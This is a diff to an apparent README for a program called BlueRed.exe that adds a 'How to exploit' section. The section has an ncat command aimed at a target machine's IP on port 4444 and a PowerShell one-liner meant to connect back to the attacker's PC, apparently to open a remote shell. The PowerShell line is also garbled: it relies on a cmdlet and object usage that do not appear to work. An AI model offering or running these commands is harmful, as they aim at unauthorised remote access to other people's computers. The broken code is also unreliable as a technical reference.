@@ -15,3 +15,9 @@ make clean && make
 
 Run:
 ./BlueRed.exe
+
+
+How to exploit:
+ncat -v -t -n -p 4444 <TargetPC_IP_Address> 4444
+
+powershell -Command "New-Object System.Net.Sockets.TCPEndPoint -Property @{LocalAddress='0.0.0.0'; LocalPort=4444}; Start-Sleep -Seconds 10; (Connect-NetTCPListener -LocalPort 4444).Connect('YourPCIP',4444)"
